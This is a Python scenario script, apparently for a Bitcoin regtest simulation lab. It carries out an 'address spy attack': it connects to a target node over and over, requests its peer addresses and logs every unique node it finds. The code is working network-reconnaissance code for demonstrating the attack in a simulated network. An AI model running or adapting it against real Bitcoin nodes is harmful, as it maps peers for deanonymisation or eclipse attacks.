#!/usr/bin/env python3

from time import sleep
from commander import Commander
from test_framework import messages
from test_framework.p2p import P2PInterface
from test_framework.messages import msg_getaddr


class SpyNode(P2PInterface):
    def __init__(self):
        super().__init__()
        self.addr_received = []
        self.connection_count = 0

    def on_addr(self, message):
        """Store received addresses"""
        for addr in message.addrs:
            self.addr_received.append({
                'ip': addr.ip,
                'port': addr.port,
                'time': addr.time,
                'services': addr.nServices,
                'connection': self.connection_count
            })
        
    def on_version(self, message):
        """Handle version and immediately request addresses"""
        super().on_version(message)
        self.send_message(msg_getaddr())


class AddrSpyScenario(Commander):
    def set_test_params(self):
        self.num_nodes = 1
        
    def add_options(self, parser):
        parser.add_argument(
            "--target",
            dest="target",
            default="tank-0000",
            help="Target node to spy on",
        )
        parser.add_argument(
            "--attempts",
            dest="attempts",
            type=int,
            default=10,
            help="Number of connection attempts",
        )
        parser.add_argument(
            "--delay",
            dest="delay",
            type=int,
            default=2,
            help="Delay between connections",
        )

    def run_test(self):
        # Get target node info
        target_node = None
        target_name = getattr(self.options, 'target', 'tank-0000')
        
        # Find target node
        for node in self.nodes:
            if node.tank == target_name:
                target_node = node
                break
                
        if not target_node:
            self.log.error(f"Target node {target_name} not found")
            return
            
        host = target_node.rpchost
        port = 18444
        
        self.log.info(f"Starting address spy attack on {target_name} ({host}:{port})")
        self.log.info("This demonstrates how a spy node can harvest network information")
        
        collected_addresses = {}
        total_connections = 0
        
        for i in range(getattr(self.options, 'attempts', 10)):
            self.log.info(f"\nConnection attempt {i+1}")
            
            try:
                spy = SpyNode()
                spy.connection_count = i + 1
                
                # Connect to target
                spy.peer_connect(
                    dstaddr=host,
                    dstport=port,
                    net="regtest",
                    timeout_factor=self.options.timeout_factor
                )()
                
                # Wait for connection
                spy.wait_for_connect()
                self.log.info(f"Connected to target")
                
                # Wait for verack and addr responses
                spy.wait_for_verack()
                sleep(getattr(self.options, 'delay', 2))
                
                # Process received addresses
                new_addrs = 0
                for addr in spy.addr_received:
                    addr_key = f"{addr['ip']}:{addr['port']}"
                    if addr_key not in collected_addresses:
                        collected_addresses[addr_key] = addr
                        new_addrs += 1
                
                self.log.info(f"Connection {i+1} found {len(spy.addr_received)} addresses ({new_addrs} new)")
                total_connections += 1
                
                # Clean disconnect
                spy.peer_disconnect()
                sleep(1)
                
            except Exception as e:
                self.log.error(f"Error in connection attempt {i+1}: {str(e)}")
                self.log.error("Exception details:", exc_info=True)

        # Print summary
        self.log.info("\nAddress Spy Attack Summary")
        self.log.info("=" * 50)
        self.log.info(f"Target Node: {target_name}")
        self.log.info(f"Total Connections Made: {total_connections}")
        self.log.info(f"Unique Addresses Discovered: {len(collected_addresses)}")
        self.log.info("\nDiscovered Network Information:")
        
        for addr_key, addr in collected_addresses.items():
            self.log.info(f"Node: {addr_key}")
            self.log.info(f"  First seen in connection: {addr['connection']}")
            self.log.info(f"  Services: {addr['services']}")
            self.log.info(f"  Timestamp: {addr['time']}")
            self.log.info("")


def main():
    AddrSpyScenario().main()


if __name__ == "__main__":
    main()